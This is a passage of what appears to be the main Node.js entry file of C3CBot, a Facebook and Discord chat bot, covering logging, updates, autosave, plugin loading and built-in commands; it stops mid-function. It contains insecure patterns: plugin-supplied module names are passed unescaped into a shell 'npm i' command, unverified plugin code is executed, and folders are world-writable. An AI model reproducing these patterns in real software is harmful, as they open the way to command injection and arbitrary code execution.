/* eslint-disable consistent-this */
/* eslint-disable no-loop-func */
/* eslint-disable require-atomic-updates */
/* eslint-disable class-methods-use-this */
/* eslint-disable no-process-env */

require("./ClassModifier.js");
var _sizeObject = function (object) {
  return Object.keys(object)
    .length;
};
global.nodemodule = {};
var os = require("os");
const fs = require('fs');
var path = require("path");
var syncrequest = require('sync-request');
var wait = require('wait-for-stuff');
var semver = require("semver");
var childProcess = require("child_process");
//var url = require("url");
//var net = require('net');
var zlib = require("zlib");
var tar = require("tar-stream");
const readline = require('readline');
var speakeasy = require("speakeasy"); //2FA
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true,
  prompt: ""
});
global.crl = rl;
var fetch = require("node-fetch");
var _checkPort = require("./checkPort.js");
var CPULoad = require("./CPULoad.js");
////var querystring = require('querystring');
////var delay = require('delay');
const StreamZip = require('node-stream-zip');
////var tf = require("@tensorflow/tfjs");
global.sshcurrsession = {};
global.sshstream = {};
//! Changing this process's priority
try {
  os.setPriority(-17); //os.constants.priority.PRIORITY_HIGH
} catch (ex) {
  console.log(
    "[NOT LOGGED]",
    "WARNING: Look like you're not running this bot in Administrator/root mode, or you're using an older NodeJS version."
  );
  if (!os.setPriority) {
    console.log(
      "[NOT LOGGED]",
      "Notice: Supported NodeJS version: 12, 13, 14"
    );
  }
  console.log("[NOT LOGGED]", "Handling setPriority error:", ex);
}

global.reload = () => {
  unloadPlugin();
  var error = loadPlugin();
  return `Reloaded${error.length == 0 ? " " : (" with error at: " + JSON.stringify(error, null, 2))}`;
};
global.fbchat = (id, mess) => {
  if (typeof facebook.api == "object") {
    var isGroup = (id.toString().length == 16);
    facebook.api.sendMessage(mess, id, () => { }, null, isGroup);
    return `Sent message: ${mess} to ${isGroup ? "Thread" : "User"} ID ${id}`;
  } else {
    return "Error: Account not logged in!";
  }
};
global.restart = () => {
  setTimeout(function () {
    process.exit(7378278);
  }, 1000);
  return "Restarting...";
};

/**
 * Find every file in a directory
 *
 * @param   {string}    startPath        A path specify where to start.
 * @param   {RegExp}    filter           Regex to filter results.
 * @param   {boolean}   arrayOutput      Options: Output array or send to callback?
 * @param   {boolean}   recursive        Options: Recursive or not?
 * @param   {function}  [callback]       Callback function.
 *
 * @return  {(Array<String>|undefined)}  An array contains path of every files match regex.
 */
function findFromDir(startPath, filter, arrayOutput, recursive, callback) {
  var nocallback = false;
  if (!callback) {
    callback = function () { };
    nocallback = true;
  }
  if (!fs.existsSync(startPath)) {
    throw "No such directory: " + startPath;
  }
  var files = fs.readdirSync(startPath);
  var arrayFile = [];
  for (var i = 0; i < files.length; i++) {
    var filename = path.join(startPath, files[i]);
    var stat = fs.lstatSync(filename);
    if (stat.isDirectory() && recursive) {
      var arrdata = findFromDir(filename, filter, true, true);
      if (!nocallback && !arrayOutput) {
        for (var n in arrdata) {
          callback(path.join(filename, arrdata[n]));
        }
      } else {
        arrayFile = arrayFile.concat(arrdata);
      }
    } else {
      if (!arrayOutput && !nocallback) {
        if (filter.test(filename)) callback(filename);
      } else {
        if (filter.test(filename)) arrayFile[arrayFile.length] = filename;
      }
    }
  }
  if (arrayOutput && !nocallback) {
    callback(arrayFile);
  } else if (arrayOutput) {
    return arrayFile;
  }
}
/**
 * Ensure <path> exists.
 *
 * @param   {string}  path  Path
 * @param   {number}  mask  Folder's mask
 *
 * @return  {object}        Error or nothing.
 */
function ensureExists(path, mask) {
  if (typeof mask != 'number') {
    mask = 0o777;
  }
  try {
    fs.mkdirSync(path, {
      mode: mask,
      recursive: true
    });
    return;
  } catch (ex) {
    return {
      err: ex
    };
  }
}
ensureExists(path.join(__dirname, "logs"));
var logFileList = findFromDir(path.join(__dirname, "logs"), /.*\.log$/, true, true);
logFileList.forEach(dir => {
  var newdir = path.join(__dirname, "logs", path.parse(dir)
    .name + ".tar.gz");
  var file = fs.readFileSync(dir);
  var pack = tar.pack();
  pack.entry({
    name: path.parse(dir)
      .name + ".log"
  }, file);
  pack.finalize();
  var tardata = Buffer.alloc(0);
  pack.on("data", chunk => {
    tardata = Buffer.concat([tardata, chunk]);
  })
    .on("end", () => {
      zlib.gzip(tardata, (err, data) => {
        if (err) throw err;
        fs.writeFileSync(newdir, data, {
          mode: 0o666
        });
        fs.unlinkSync(dir);
      });
    });
});

var log = require("./logger.js");

//Capturing STDERR
var _stderrold = process.stderr.write;
global.stderrdata = "";
process.stderr.write = function (chunk, encoding, callback) {
  global.stderrdata += chunk;
  if (typeof callback == "function") {
    callback();
  }
};
setInterval(() => {
  if (global.stderrdata != "" && global.stderrdata.indexOf("Hi there 👋. Looks like you are running TensorFlow.js in Node.js. To speed things up dramatically, install our node backend, which binds to TensorFlow C++, by running npm i @tensorflow/tfjs-node, or npm i @tensorflow/tfjs-node-gpu if you have CUDA. Then call require('@tensorflow/tfjs-node'); (-gpu suffix for CUDA) at the start of your program. Visit https://github.com/tensorflow/tfjs-node for more details.") == -1) {
    var arr = global.stderrdata.split(/[\r\n]|\r|\n/g)
      .filter((val) => val != "");
    arr.splice(arr.length - 1, 1);
    for (var n in arr) {
      log("[STDERR]", arr[n]);
    }
  }
  global.stderrdata = "";
}, 499);

//Handling rejected promise that are unhandled
process.on('unhandledRejection', (reason, promise) => {
  log("[INTERNAL]", 'Warning: Rejected promise: ', promise, ', reason:', reason);
});
//Handling uncaught exception (without try/catch, usually in callback)
//! DEFINELY NOT SAFE AT ALL, BUT STILL ADDING IT.
process.on('uncaughtException', (err, origin) => {
  log("[INTERNAL]", `Warning: ${origin}:`, err);
});

var autoUpdater = require("./autoUpdater.js");
var cUpdate = autoUpdater.checkForUpdate();

//Outputs version 
var version = cUpdate.currVersion;
log("Starting C3CBot version", version, "...");

global.config = require("./getConfig.js")();

var testmode = global.config.testmode;
var prefix = global.config.baseprefix;

var availableLangFile = findFromDir(path.join(__dirname, "lang"), /.*\.yml$/, true, false);
var langMap = {};
var yamlParser = require('js-yaml');
availableLangFile.forEach(v => {
  var lang = path.parse(v);
  log("[INTERNAL]", "Loading language:", lang.name);
  var ymlData = fs.readFileSync(v, { encoding: "utf8" });
  langMap[lang.name] = yamlParser.load(ymlData);
});
var getLang = function (langVal, id, oLang) {
  var lang = global.config.language;
  if (id && global.data.userLanguage[id]) {
    lang = global.data.userLanguage[id];
    if (!langMap[lang]) {
      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
      lang = global.config.language;
    }
  }
  if (oLang) {
    lang = oLang;
    if (!langMap[lang]) {
      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
      lang = global.config.language;
    }
  }

  if (langMap[lang]) {
    return String(langMap[lang][langVal]);
  } else {
    log("[INTERNAL]", "Warning: Invalid language: ", lang, "; using en_US as fallback...");
    return String((langMap["en_US"] || {})[langVal]);
  }
};

/**
 * Resolves data received from base and return formatted UserID.
 *
 * @param   {string}  type  Platform name
 * @param   {string}  data  Data to be resolved by plugins
 *
 * @return  {string}        Formatted UserID
 */
var resolveID = function (type, data) {
  switch (type) {
    case "Facebook":
      return "FB-" + data.msgdata.senderID;
    case "Discord":
      return "DC-" + data.msgdata.author.id;
    default:
      return "";
  }
};

if (global.config.facebookProxyUseSOCKS) {
  var ProxyServer = require("./SOCK2HTTP.js")(log);
  var fS2HResolve = function () { };
  var S2HPromise = new Promise(resolve => {
    fS2HResolve = resolve;
  });
  var localSocksProxy = new ProxyServer({
    socks: global.config.facebookProxy
  })
    .listen(global.config.portSOCK2HTTP, global.config.addressSOCK2HTTP || "0.0.0.0")
    .on("listening", () => {
      log("[SOCK2HTTP]", `Listening at ${localSocksProxy.address().address}:${localSocksProxy.address().port}`);
      fS2HResolve({
        address: localSocksProxy.address()
          .address,
        port: localSocksProxy.address()
          .port
      });
    })
    .on("error", err => {
      log("[SOCK2HTTP]", err);
    });
  var S2HResponse = wait.for.promise(S2HPromise);
  var sock2httpPort = S2HResponse.port;
  var sock2httpAddress = S2HResponse.address;
}

let obf = require("./obfuscator.js");
var _prefixObf = setInterval(() => {
  prefix = obf(global.config.baseprefix);
  if (prefix == "") prefix = "\u200B".repeat(random(1, 10));
}, 1000);

/**
 * Get a randomized number
 *
 * @param  {number} min Minimum
 * @param  {number} max Maximum
 * 
 * @returns {number} A randomized number.
 */
var random = function (min, max) {
  if (min > max) {
    var temp = min;
    min = max;
    max = temp;
  }
  var bnum = (max - min)
    .toString(16)
    .length / 2;
  if (bnum < 1) bnum = 1;
  return Math.round(parseInt(crypto.randomBytes(bnum)
    .toString('hex'), 16) / Math.pow(16, bnum * 2) * (max - min)) + min;
};
/**
 * Get some random bytes
 *
 * @param  {number} numbytes Number of bytes.
 * @returns {string} Random bytes.
 */
var _randomBytes = function (numbytes) {
  numbytes = numbytes || 1;
  return crypto.randomBytes(numbytes)
    .toString('hex');
};
//Cryptography
var crypto = require('crypto');

/**
 * Get a HMAC hash.
 *
 * @param   {string}  publick            Public key
 * @param   {string}  privatek           Private key
 * @param   {string}  [algo=sha512]      Algrorithim
 * @param   {string}  [output=hex]       Output type
 *
 * @return  {string}                     HMAC hash
 */
function _HMAC(publick, privatek, algo, output) {
  algo = algo || "sha512";
  output = output || "hex";
  var hmac = crypto.createHmac(algo, privatek);
  hmac.update(publick);
  var value = hmac.digest(output);
  return value;
}

////Global data load
//// global.dataSave = wait.for.promise(autosave('data' + (testmode ? "-test" : "") + '.json'));
//// global.data = onChange(global.dataSave.data, function(){});
//// global.watch('data', function (id, oldval, newval) {
//// global.dataSave.data = global.data;
//// });

//* Load data
if (testmode) {
  fs.existsSync(path.join(__dirname, "data-test.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data-test.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
} else {
  fs.existsSync(path.join(__dirname, "data.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
}
global.dataBackup = JSON.parse(JSON.stringify(global.data));
//*Auto-save global data clock
global.isDataSaving = false;
global.dataSavingTimes = 0;
var autosave = setInterval(function (testmode, log) {
  if ((!global.isDataSaving || global.dataSavingTimes > 3) && JSON.stringify(global.data) !== JSON.stringify(global
    .dataBackup)) {
    if (global.dataSavingTimes > 3) {
      log("[INTERNAL]", "Auto-save clock is executing over 30 seconds! (", global.dataSavingTimes, ")");
    }
    global.isDataSaving = true;
    try {
      if (testmode) {
        fs.writeFileSync(path.join(__dirname, "data-test-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-test-temp.json"), path.join(__dirname, "data-test.json"));
      } else {
        fs.writeFileSync(path.join(__dirname, "data-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-temp.json"), path.join(__dirname, "data.json"));
      }
    } catch (err) {
      log("[INTERNAL]", "Auto-save encounted an error:", err);
    }
    global.isDataSaving = false;
    global.dataSavingTimes = 0;
    global.dataBackup = JSON.parse(JSON.stringify(global.data));
  } else {
    if (JSON.stringify(global.data) != JSON.stringify(global.dataBackup)) {
      global.dataSavingTimes++;
    }
  }
}, 10000, testmode, log);

var currentCPUPercentage = 0;
var _titleClocking = setInterval(async () => {
  var titleescape1 = String.fromCharCode(27) + ']0;';
  var titleescape2 = String.fromCharCode(7);
  currentCPUPercentage = await (new CPULoad(1000));
  var title = global.config.botname + " v" + version + " | " + (currentCPUPercentage * 100)
    .toFixed(0) + "% CPU" + " | " + ((os.totalmem() - os.freemem()) / 1024 / 1024)
      .toFixed(0) + " MB" + "/" + (os.totalmem() / 1024 / 1024)
        .toFixed(0) + " MB RAM" + " | BOT: " + (process.memoryUsage()
          .rss / 1024 / 1024)
          .toFixed(0) + " MB USED";
  process.title = title;
  // eslint-disable-next-line no-extra-boolean-cast
  if (!!global.sshcurrsession) {
    if (typeof global.sshcurrsession == "object") {
      for (var session in global.sshstream) {
        try {
          global.sshstream[session].stdout.write(titleescape1 + title + titleescape2);
        } catch (ex) { }
      }
    }
  }
}, 3000);
/**
 * "require" with data as string
 *
 * @param   {string}  src       Source code
 * @param   {string}  filename  File name
 *
 * @return  {any}               module.exports of source code
 */
function requireFromString(src, filename) {
  var Module = module.constructor;
  var m = new Module();
  m._compile(src, filename);
  return m.exports;
}

//Auto updater
function checkUpdate(silent, cUpdate) {
  var newUpdate = cUpdate || autoUpdater.checkForUpdate();
  if (!silent || newUpdate.newUpdate) {
    log(
      "[Updater]",
      `You are using build ${newUpdate.currVersion}, and ${newUpdate.newUpdate ? "there is a new build (" + newUpdate.version + ")" : "there are no new build."}`
    );
  }
  if (newUpdate.newUpdate && global.config.autoUpdate) {
    log("[Updater]", `Downloading build ${newUpdate.version}...`);
    autoUpdater.installUpdate()
      .then(function (ret) {
        var [success, value] = ret;
        if (success) {
          log("[Updater]", `Updated with ${value} entries extracted. Triggering restart...`);
          process.exit(7378278);
        } else {
          log("[Updater]", "Failed to install new build:", value);
        }
      })
      .catch(function (ex) {
        log("[Updater]", "Failed to install new build:", ex);
      });
  }
}
checkUpdate(false, cUpdate);

if (global.config.autoUpdateTimer > 0 && global.config.autoUpdate) {
  setInterval(checkUpdate, global.config.autoUpdateTimer * 60 * 1000, true);
}

//Plugin Load
ensureExists(path.join(__dirname, "plugins/"));

function checkPluginCompatibly(version) {
  version = version.toString();
  try {
    //* Plugin complied with version 0.3.0 => 0.3.14 and 0.4.0 and 0.5.0 is allowed
    var allowedVersion = "0.3.0 - 0.3.14 || 0.4.0 || 0.5.0";
    return semver.intersects(semver.clean(version), allowedVersion);
  } catch (ex) {
    return false;
  }
}

function loadPlugin() {
  var error = [];
  global.plugins = {}; //Plugin Scope
  var pltemp1 = {}; //Plugin Info
  var pltemp2 = {}; //Plugin Executable
  global.fileMap = {};
  global.loadedPlugins = {};
  global.chatHook = [];
  !global.commandMapping ? global.commandMapping = {} : "";
  log("[INTERNAL]", "Searching for plugins in ./plugins/ ...");
  var pluginFileList = findFromDir(path.join(__dirname, "plugins/"), /.*\.(z3p|zip)$/, true, false);
  for (var n in pluginFileList) {
    let zip = null;
    try {
      zip = new StreamZip({
        file: pluginFileList[n],
        storeEntries: true
      });
      wait.for.event(zip, "ready");
      try {
        var plinfo = JSON.parse(zip.entryDataSync('plugins.json')
          .toString('utf8'));
      } catch (ex) {
        throw "Invalid plugins.json file (Broken JSON)!";
      }
      if (!plinfo["plugin_name"] || !plinfo["plugin_scope"] || !plinfo["plugin_exec"]) {
        throw "Invalid plugins.json file (Not enough data)!";
      }
      if (!plinfo["complied_for"]) {
        throw "Plugin doesn't have complied_for (Complied for <=0.2.8?).";
      } else {
        if (!checkPluginCompatibly(plinfo["complied_for"])) {
          throw "Plugin is complied for version {0}, but this version doesn't compatible with it.".replace(
            "{0}",
            plinfo["complied_for"]
          );
        }
      }
      try {
        var plexec = zip.entryDataSync(plinfo["plugin_exec"])
          .toString('utf8');
      } catch (ex) {
        throw "Executable file " + plinfo["plugin_exec"] + " not found.";
      }
      if (typeof plinfo["file_map"] == "object" && !plinfo["file_map"].map) {
        for (var fd in plinfo["file_map"]) {
          try {
            global.fileMap[plinfo["file_map"][fd]] = zip.entryDataSync(fd);
          } catch (ex) {
            throw "File " + plinfo["plugin_exec"] + " not found.";
          }
        }
      }
      if (typeof plinfo["node_depends"] == "object") {
        for (var nid in plinfo["node_depends"]) {
          var defaultmodule = require("module")
            .builtinModules;
          var moduledir = path.join(__dirname, "plugins", "node_modules", nid);
          try {
            if (defaultmodule.indexOf(nid) != -1 || (["jimp", "wait-for-stuff", "deasync", "discord.js", "fca-unofficial"]).indexOf(nid) != -1) {
              global.nodemodule[nid] = require(nid);
            } else {
              global.nodemodule[nid] = require(moduledir);
            }
          } catch (ex) {
            log(
              "[INTERNAL]", pluginFileList[n], "is requiring node modules named", nid,
              "but it isn't installed. Attempting to install it through npm package manager..."
            );
            childProcess.execSync("npm i " + nid + (plinfo["node_depends"][
              nid] == "*" || plinfo["node_depends"][nid] == "" ? "" : ("@" + plinfo["node_depends"][nid])), {
              stdio: "ignore",
              cwd: path.join(__dirname, "plugins")
            });
            //Loading 3 more times before drop that plugins
            var moduleLoadTime = 0;
            var exception = "";
            var success = false;
            for (moduleLoadTime = 1; moduleLoadTime <= 3; moduleLoadTime++) {
              wait.for.promise(new Promise(x => setTimeout(x, 200)));
              require.cache = {};
              try {
                if (defaultmodule.indexOf(nid) != -1 || nid == "jimp") {
                  global.nodemodule[nid] = require(nid);
                } else {
                  global.nodemodule[nid] = require(moduledir);
                }
                success = true;
                break;
              } catch (ex) {
                exception = ex;
              }
              if (success) {
                break;
              }
            }
            if (!success) {
              throw "Cannot load node module: " + nid + ". Additional info: " + exception;
            }
          }
        }
      }
      pltemp1[plinfo["plugin_name"]] = plinfo;
      pltemp1[plinfo["plugin_name"]].filename = pluginFileList[n];
      pltemp2[plinfo["plugin_name"]] = plexec;
      zip.close();
    } catch (ex) {
      log("[INTERNAL]", "Error while loading plugin at \"" + pluginFileList[n] + "\":", ex);
      error.push(pluginFileList[n]);
      delete pltemp1[plinfo["plugin_name"]];
      delete pltemp2[plinfo["plugin_name"]];
      if (zip) {
        zip.close();
      }
    }
  }
  for (var plname in pltemp1) {
    var passed = true;
    if (pltemp1[plname]["dependents"]) {
      for (var no in pltemp1[plname]["dependents"]) {
        if (typeof pltemp1[pltemp1[plname]["dependents"][no]] != "object") {
          passed = false;
          log("[INTERNAL]", plname, "depend on plugin named", pltemp1[plname][
            "dependents"][no] + ", but that plugin is not installed/loaded.");
        }
      }
    }
    if (passed) {
      try {
        global.plugins[pltemp1[plname]["plugin_scope"]] = requireFromString(pltemp2[plname], path.join(pltemp1[plname].filename, pltemp1[plname]["plugin_exec"]));
        for (var cmd in pltemp1[plname]["command_map"]) {
          var cmdo = pltemp1[plname]["command_map"][cmd];
          if (!cmdo["hdesc"] || !cmdo["fscope"] || isNaN(parseInt(cmdo["compatibly"]))) {
            log("[INTERNAL]", plname, "has a command that isn't have enough information to define (/" + cmd + ")");
          } else if (
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "Function" &&
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "AsyncFunction"
          ) {
            log("[INTERNAL]", plname, "is missing a function for /" + cmd);
          } else {
            var oldstr;
            if (typeof cmdo.hdesc != "object") {
              oldstr = cmdo.hdesc;
              cmdo.hdesc = {};
              cmdo.hdesc[global.config.language] = oldstr;
            }
            if (cmdo.hargs) {
              if (typeof cmdo.hargs != "object") {
                oldstr = cmdo.hargs;
                cmdo.hargs = {};
                cmdo.hargs[global.config.language] = oldstr;
              }
            } else {
              cmdo.hargs = {};
              cmdo.hargs[global.config.language] = "";
            }
            global.commandMapping[cmd] = {
              args: cmdo.hargs,
              desc: cmdo.hdesc,
              scope: global.plugins[pltemp1[plname]["plugin_scope"]][cmdo
                .fscope],
              compatibly: parseInt(cmdo.compatibly),
              handler: plname
            };
            if (Object.prototype.hasOwnProperty.call(cmdo, "adminCmd")) {
              global.commandMapping[cmd].adminCmd = true;
            }
          }
        }
        if (typeof pltemp1[plname]["chatHook"] == "string" &&
          typeof pltemp1[plname]["chatHookType"] == "string" &&
          !isNaN(parseInt(pltemp1[plname]["chatHookPlatform"])) &&
          (
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "Function" ||
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "AsyncFunction"
          )) {
          global.chatHook.push({
            resolverFunc: global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]],
            listentype: pltemp1[plname]["chatHookType"],
            listenplatform: parseInt(pltemp1[plname]["chatHookPlatform"]),
            handler: plname
          });
        }
        if (typeof global.plugins[pltemp1[plname]["plugin_scope"]].onLoad == "function") {
          (function (plname) {
            global.plugins[pltemp1[plname]["plugin_scope"]].onLoad({
              // eslint-disable-next-line no-loop-func
              log: function logPlugin(...message) {
                log.apply(global, [
                  "[PLUGIN]",
                  "[" + plname + "]"
                ].concat(message));
              }
            });
          })(String(plname));
        }
        global.loadedPlugins[plname] = {
          author: pltemp1[plname].author,
          version: pltemp1[plname].version,
          onUnload: global.plugins[pltemp1[plname]["plugin_scope"]].onUnload
        };
        log("[INTERNAL]", "Loaded", plname, pltemp1[plname].version, "by", pltemp1[plname].author);
      } catch (ex) {
        log(
          "[INTERNAL]", plname,
          "contains an malformed executable code and cannot be loaded. Plugin depend on this code may not work correctly. Additional information:",
          ex
        );
        error.push(pltemp1[plname].filename);
      }
    }
  }
  global.commandMapping["systeminfo"] = {
    args: {},
    desc: "Show system info",
    scope: function () {
      var uptime = os.uptime();
      var utdate = new Date(uptime);
      return {
        handler: "internal",
        data: `System info:\r\n- CPU arch: ${os.arch()}\r\n- OS type: ${os.type()} (Platform: ${os.platform()})\r\n- OS version: ${os.release()}\r\n- Uptime: ${(uptime / 3600 / 24).floor(0).pad(2)}:${utdate.getUTCHours().pad(2)}:${utdate.getUTCMinutes().pad(2)}:${utdate.getUTCSeconds().pad(2)}\r\n- Total memory: ${os.totalmem() / 1048576} MB\r\n- Heroku: ${(!!process.env.PORT).toString()}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["updatebot"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (data.admin) {
        var newUpdate = autoUpdater.checkForUpdate();
        log(
          "[Updater]",
          `You are using build ${newUpdate.currVersion}, and ${newUpdate.newUpdate ? "there is a new build (" + newUpdate.version + ")" : "there are no new build."}`
        );
        data.return({
          data: `Current build: ${newUpdate.currVersion}\r\nLatest build: ${newUpdate.version}.${newUpdate.newUpdate ? "\r\nUpdating..." : ""}`,
          handler: "internal"
        });
        if (newUpdate.newUpdate) {
          log("[Updater]", `Downloading build ${newUpdate.version}...`);
          autoUpdater.installUpdate()
            .then(function (ret) {
              var [success, value] = ret;
              if (success) {
                log("[Updater]", `Updated with ${value} entries extracted. Triggering restart...`);
                data.return({
                  handler: "internal",
                  data: "Extracted files. Restarting..."
                });
                setTimeout(() => process.exit(7378278), 1000);
              } else {
                log("[Updater]", "Failed to install new build:", value);
                data.return({
                  handler: "internal",
                  data: "Failed to install new build: " + value
                });
              }
            })
            .catch(function (ex) {
              log("[Updater]", "Failed to install new build:", ex);
              data.return({
                handler: "internal",
                data: "Failed to install new build: " + ex
              });
            });
        }
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };
  global.commandMapping["version"] = {
    args: {},
    desc: {},
    scope: function (_type, _data) {
      var githubdata = JSON.parse(syncrequest("GET", "https://api.github.com/repos/lequanglam/c3c/git/refs/tags", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      })
        .body.toString());
      var latestrelease = githubdata[githubdata.length - 1];
      var latestgithubversion = latestrelease.ref.replace("refs/tags/", "");
      var codedata = JSON.parse(syncrequest(
        "GET",
        "https://raw.githubusercontent.com/lequanglam/c3c/master/package.json", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      }
      )
        .body.toString());
      var latestcodeversion = codedata.version;
      return {
        handler: "internal",
        data: "Currently running on version " + version + "\r\nLatest GitHub version: " + latestgithubversion +
          "\r\nLatest code version: " + latestcodeversion
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["version"].args[global.config.language] = "";
  global.commandMapping["version"].desc[global.config.language] = getLang("VERSION_DESC");
  global.commandMapping["help"] = {
    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_DESC"]])),
    scope: function (type, data) {
      let ul = global.data.userLanguage[resolveID(type, data)] || global.config.language;
      if (isNaN(parseInt(data.args[1])) && data.args.length != 1) {
        var cmd = data.args[1];
        if (Object.prototype.hasOwnProperty.call(global.commandMapping, cmd)) {
          var mts = global.config.commandPrefix + cmd;
          if (typeof global.commandMapping[cmd].args == "object") {
            let ha = global.commandMapping[cmd].args;
            if (typeof ha[ul] == "string") {
              ha = ha[ul];
            } else {
              ha = ha[global.config.language];
              typeof ha == "undefined" ? ha = "" : "";
            }
            if (ha.replace(/ /g).length != 0) {
              mts += ` ${ha}`;
            }
          }
          mts += "\r\n" + global.commandMapping[cmd].desc[ul] || global.commandMapping[cmd].desc[global.config.language];
          mts += "\r\n" + getLang("HELP_ARG_INFO", resolveID(type, data));
          return {
            handler: "internal",
            data: mts
          };
        } else {
          return {
            handler: "internal",
            data: global.config.commandPrefix + cmd + "\r\n" + getLang("HELP_CMD_NOT_FOUND", resolveID(type, data))
          };
        }
      } else {
        var page = 1;
        page = parseInt(data.args[1]) || 1;
        if (page < 1) page = 1;
        let mts = "";
        mts += getLang("HELP_OUTPUT_PREFIX", resolveID(type, data));
        var helpobj = global.commandMapping["help"];
        helpobj.command = "help";
        helpobj.args[ul] = getLang("HELP_ARGS", resolveID(type, data));
        helpobj.desc[ul] = getLang("HELP_DESC", resolveID(type, data));
        var hl = [helpobj];
        for (var no in global.commandMapping) {
          if (no !== "help") {
            var tempx = global.commandMapping[no];
            tempx.command = no;
            hl.push(tempx);
          }
        }
        if (type == "Discord") {
          mts += "\r\n```HTTP";
        }
        var compatiblyFlag = 0;
        switch (type) {
          case "Facebook":
            compatiblyFlag = 1;
            break;
          case "Discord":
            compatiblyFlag = 2;
            break;
        }
        for (var i = 15 * (page - 1); i < 15 * (page - 1) + 15; i++) {
          if (i < hl.length) {
            if (hl[i].compatibly == 0 || (hl[i].compatibly & compatiblyFlag)) {
              if (data.admin) {
                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
                if (typeof hl[i].args == "object") {
                  let ha = hl[i].args;
                  if (typeof ha[ul] == "string") {
                    ha = ha[ul];
                  } else {
                    ha = ha[global.config.language];
                    typeof ha == "undefined" ? ha = "" : "";
                  }
                  if (ha.replace(/ /g).length != 0) {
                    mts += ` ${ha}`;
                  }
                } else if (typeof hl[i].args == "string") {
                  mts += ` ${hl[i].args}`;
                }
              } else if (!hl[i].adminCmd) {
                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
                if (typeof hl[i].args == "object") {
                  let ha = hl[i].args;
                  if (typeof ha[ul] == "string") {
                    ha = ha[ul];
                  } else {
                    ha = ha[global.config.language];
                    typeof ha == "undefined" ? ha = "" : "";
                  }
                  if (ha.replace(/ /g).length != 0) {
                    mts += ` ${ha}`;
                  }
                }
              }
            }
          }
        }
        if (type == "Discord") {
          mts += "\n```";
        }
        mts += `\n(${getLang("PAGE", resolveID(type, data))} ${page}/${(hl.length / 15).ceil()})`;
        mts += `\n${getLang("HELP_MORE_INFO", resolveID(type, data)).replace("{0}", global.config.commandPrefix)}`;
        return {
          handler: "internal",
          data: mts
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL"
  };

  global.commandMapping["restart"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RESTART_DESC"]])),
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseRestartCommand) {
        setTimeout(function () {
          process.exit(7378278);
        }, 1000);
        return {
          handler: "internal",
          data: "Restarting..."
        };
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };

  global.commandMapping["shutdown"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["SHUTDOWN_DESC"]])),
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseShutdownCommand) {
        setTimeout(function () {
          process.exit(74883696);
        }, 1000);
        return {
          handler: "internal",
          data: "Shutting down..."
        };
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };

  global.commandMapping["plugins"] = {
    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["PLUGINS_DESC"]])),
    scope: function (type, data) {
      if (!data.admin && !global.config.allowUserUsePluginsCommand) {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
      var page = 1;
      page = parseInt(data.args[1]) || 1;
      if (page < 1) page = 1;
      var mts = "";
      mts += getLang("PLUGINS_OUTPUT_PREFIX", resolveID(type, data));
      var hl = [];
      for (var no in global.loadedPlugins) {
        var tempx = global.loadedPlugins[no];
        tempx.name = no;
        hl.push(tempx);
      }
      if (type == "Discord") {
        mts += "\r\n```HTTP";
      }
      for (var i = 5 * (page - 1); i < 5 * (page - 1) + 5; i++) {
        if (i < hl.length) {
          mts += "\r\n" + (i + 1)
            .toString() + ". " + hl[i].name;
          if (!!hl[i].version && hl[i].version != "") {
            mts += " " + hl[i].version;
          }
          mts += " by " + hl[i].author;
        }
      }
      if (type == "Discord") {
        mts += "\r\n```";
      }
      mts += '\r\n(Page ' + page + '/' + (hl.length / 5)
        .ceil() + ')';
      return {
        handler: "internal",
        data: mts
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUsePluginsCommand
  };

  global.commandMapping["reload"] = {
    args: {},
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RELOAD_DESC"]])),
    scope: function (type, data) {
